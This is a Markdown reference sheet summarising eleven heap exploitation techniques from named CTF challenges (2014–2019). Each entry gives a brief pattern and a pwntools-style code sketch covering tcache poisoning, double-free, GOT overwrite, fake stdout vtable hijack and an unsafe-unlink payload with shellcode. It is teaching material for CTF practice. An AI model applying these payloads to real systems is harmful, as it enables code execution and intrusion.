# Heap Exploitation Techniques (Part 2)

## Table of Contents
- [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
- [Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)](#uninitialized-chunk-residue-pointer-leak-picoctf-2018)
- [tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)](#tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018)
- [Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)](#adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite-ritsec-2018)
- [Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)](#hidden-menu-option-1337-for-tcache-poisoning-fireshell-2019)
- [Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)](#tcache-double-free--fake-_io_file-vtable-stdout-hijack-bctf-2018)
- [Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)](#tcache-to-fastbin-promotion-cross-bin-attack-bctf-2018)
- [6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)](#6-bit-index-oob--written_bytes-accumulator-for-fn-pointer-increment-codegate-2019)
- [IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)](#is_mmaped-bit-flip-for-unsorted-bin-leak-on-callocd-chunk-0ctf-2017)
- [Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)](#filename-regex-constrained-fastbin-via-lsb-only-heap-pointer-overwrite-bsidessf-2019)
- [Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)](#custom-allocator-unsafe-unlink-to-got-def-con-qualifier-2014)

---

## UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)

**Pattern:** After UAF, heap spray fills memory with `system()` addresses at offset +3. Object address `0xXX006873` encodes ASCII `"sh\x00"` at start, so `system(this)` executes `system("sh")`.

```python
# Heap spray: system_addr at offset +3 in each spray chunk
# Object at 0xXX006873 → bytes at start: 73 68 00 XX = "sh\x00..."
# vtable call → system(object_pointer) → system("sh")
```

---

## Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)

**Pattern:** `struct contact { char *name; char *bio; }` where `bio` is never initialized. After delete-create cycle, new allocation reuses chunk with stale pointer in `bio` field → leak via `print_contact()`.

```c
struct contact *c = malloc(sizeof *c);
c->name = malloc(NAME_SZ);
read_line(c->name, NAME_SZ);
// bio left uninitialized!
```

---

## tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)

**Pattern:** `strcpy` null byte overflow clears PREV_INUSE on next chunk. With forged `prev_size`, `free()` triggers backward consolidation across tcache-resident chunk. Split remainder chunk keeps main_arena pointers in fd/bk for libc leak.

```python
# Overflow: strcpy writes past chunk boundary, null clears PREV_INUSE
# Forge prev_size for backward consolidate
# free(victim) → consolidate with fake chunk → overlapping regions
# Split to extract libc pointer from old fd/bk
```

---

## Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)

**Pattern:** Go binary with cgo places name buffer adjacent to C-style struct with function pointer. Overflow corrupts fn pointer. First overwrite → `puts(got['free'])` to leak libc. Second → `system` at `free@GOT`. Then `free("/bin/sh")`.

```python
# Leak: payload = name_overflow + p64(puts_plt) + p64(pop_rdi) + p64(free_got)
# Overwrite: name_overflow + p64(system_addr)
# free(binsh_chunk) → system("sh")
```

---

## Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)

**Pattern:** Undocumented menu option calls `malloc/edit` without updating counter — unlimited allocations. Combined with vanilla tcache UAF, flood tcache and overwrite fd to BSS target.

```python
def hidden(sz, data):
    sendline(b'1337')  # undocumented option
    sendline(str(sz).encode())
    send(data)

free(0); free(1)
hidden(0x20, p64(bss_target))  # tcache fd → bss
malloc(0x20); malloc(0x20)     # returns bss → arbitrary write
```

---

## Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)

**Pattern:** Double-free into tcache (no fastbin checks). Malloc to obtain tcache entry pointing to `_IO_2_1_stdout_`. Overwrite stdout's vtable to fake jump table where `_IO_file_overflow` → `system`. Next `printf` executes.

```python
free(A); free(A)  # double-free bypasses tcache checks
edit(A, p64(stdout))  # tcache fd → stdout
malloc(); malloc()  # returns &stdout
edit(stdout, fake_file_struct(vtable=fake_vt))
# printf → system("sh")
```

---

## Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)

**Pattern:** Only ~2 allocations available. Fill tcache, overflow into fastbin, craft chunk whose header points inside a known structure. When fastbin promotes back to tcache (after drain), malloc returns header address.

```python
for _ in range(7): free(tcache[_])  # fill tcache
free(fastbin_chunk)                   # → fastbin
edit(fastbin_chunk, p64(target_hdr)) # poison fastbin fd
for _ in range(7): malloc(size)      # drain tcache
free(fastbin_chunk)                   # promote → tcache
malloc(size)                          # returns target_hdr → arbitrary write
```

---

## 6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)

**Pattern:** C++ compressor with 48-element QWORD cache but 6-bit index (0-63). OOB access into surrounding object. Use `written_bytes` counter as arithmetic accumulator to turn QWORD-aligned write into byte-precise fn-pointer increment.

```python
# cache_qword(a2, k) → cached_qwords[a2] = buf[buf_off_Q - k]
# save_cached_qword_to_comp(a2) → buf[++off] = cached_qwords[a2]; written_bytes += 8
# Pre-save print_uncomp_fsz into buf via OOB save at 0x34
# OOB cache_qword(0x33, 1) moves buf → written_bytes
# Emit 0x38 QWORDs → written_bytes += 0x1c0 (offset to cat_flag)
# Save written_bytes to buf, OOB write on top of print_uncomp_fsz
```

---

## IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)

**Pattern:** `calloc` zeroes chunks unless `IS_MMAPED` flag set. Overflow to flip IS_MMAPED bit on freed unsorted bin chunk. `calloc` reuse skips memset, preserving fd/bk arena pointers for libc leak.

```python
# Layout: A (0x80) | B (0x80 freed → unsorted) | C (victim overflow)
# Overflow from A into B's header: set size |= IS_MMAPED (bit 1)
edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))
malloc(0x80)  # B with IS_MMAPED → calloc does NOT memset → libc leak survives
```

---

## Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)

**Pattern:** `RENAME old new` length-checks `old_name` but not `new_name`, giving bounded overflow. Filename must match `[A-Za-z0-9]+.[A-Za-z0-9]{3}` — only LSB of heap pointer is unconstrained after null. Corrupt only LSB of `prev_file` so it re-points into attacker-controlled data.

```python
# Create file with data bytes forming fake file_t chunk header
# RENAME overwrites only LSB of prev_file pointer
# LSB change → prev_file points inside data region → fake chunk
# DELE forged entry → double-free → fastbin poison
```

---

## Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)

**Pattern:** Non-glibc allocator with naive `free` — `mem[fd] = bk` without safe-unlink check. Overflow chunk 10 (0x104 bytes) into chunk 11's fd/bk. Free chunk 9 → unlink writes `printf@GOT → shellcode jump`.

```python
payload  = p32(printf_got - 8)        # fake fd → target
payload += p32(array_10_addr + 8)     # fake bk → shellcode jump
payload += b"\xeb\x08" + b"A"*8 + asm(shellcraft.sh())  # jmp +8; shellcode
payload += b"A" * (260 - len(payload))
payload += p32(0)                     # next chunk prev_in_use = 0
```
